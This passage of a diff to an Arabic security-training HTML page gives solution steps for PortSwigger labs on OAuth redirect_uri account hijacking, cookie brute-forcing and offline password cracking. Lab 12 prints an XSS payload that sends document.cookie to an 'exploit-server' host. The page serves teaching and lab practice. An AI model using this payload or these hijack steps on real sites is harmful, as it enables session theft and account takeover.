+                <p><strong>التقنية:</strong> توجيه authorization code لخادم المهاجم</p>
+                <div class="code-block">
+# خطوات الحل:
+1. ابدأ OAuth flow وحلل redirect_uri
+2. غيّر redirect_uri إلى exploit server
+3. أرسل الرابط للضحية
+4. اعترض authorization code من exploit server logs
+5. استخدم code لتسجيل الدخول كالضحية
+                </div>
+                <a href="https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <h3>💪 مختبرات متقدمة</h3>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 11: Brute-forcing a stay-logged-in cookie</h4>
+                <p><strong>الهدف:</strong> كسر stay-logged-in cookie مُرمز بـ Base64</p>
+                <p><strong>التقنية:</strong> Brute force على MD5(password) المُرمز بـ Base64</p>
+                <div class="code-block">
+# خطوات الحل:
+1. حلل stay-logged-in cookie: base64decode(username:md5(password))
+2. أنشئ قائمة كلمات مرور مُرمزة: carlos:md5(password)
+3. رمّز كل واحدة بـ Base64
+4. استخدم Burp Intruder للـ brute force
+5. سجل دخول بالـ cookie الصحيح
+                </div>
+                <a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 12: Offline password cracking</h4>
+                <p><strong>الهدف:</strong> استغلال XSS لسرقة cookie وكسر كلمة المرور</p>
+                <p><strong>التقنية:</strong> XSS + Cookie theft + Password cracking</p>
+                <div class="code-block">
+# خطوات الحل:
+1. اكتشف XSS في comment section
+2. أنشئ payload لسرقة cookie:
+   <script>document.location='//exploit-server/'+document.cookie</script>
+3. اعترض stay-logged-in cookie من exploit server
+4. فك تشفير وكسر MD5 hash
+5. سجل دخول بالبيانات المكسورة
+                </div>
+                <a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="tip">
+                <h4>💡 نصائح لحل المختبرات</h4>
+                <ul class="list">
+                    <li><strong>استخدم Burp Suite:</strong> أداة أساسية لاعتراض وتعديل الطلبات</li>
+                    <li><strong>حلل الردود:</strong> ابحث عن اختلافات في response length أو error messages</li>
+                    <li><strong>اقرأ التوثيق:</strong> كل مختبر له تلميحات مفيدة</li>
+                    <li><strong>استخدم jwt.io:</strong> لفك تشفير وتحليل JWT tokens</li>
+                    <li><strong>احفظ النتائج:</strong> وثق كل خطوة للمراجعة لاحقاً</li>
+                </ul>
             </div>
         </section>
 
@@ -336,5 +915,20 @@ signature = HMAC_SHA256(base64url(header)+"."+base64url(payload), secret)
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+    <script>
+        mermaid.initialize({
+            startOnLoad: true,
+            theme: 'dark',
+            themeVariables: {
+                primaryColor: '#3b82f6',
+                primaryTextColor: '#ffffff',
+                primaryBorderColor: '#1e40af',
+                lineColor: '#64b5f6',
+                secondaryColor: '#1e293b',
+                tertiaryColor: '#0f172a'
+            }
+        });
+    </script>
 </body>
 </html> 
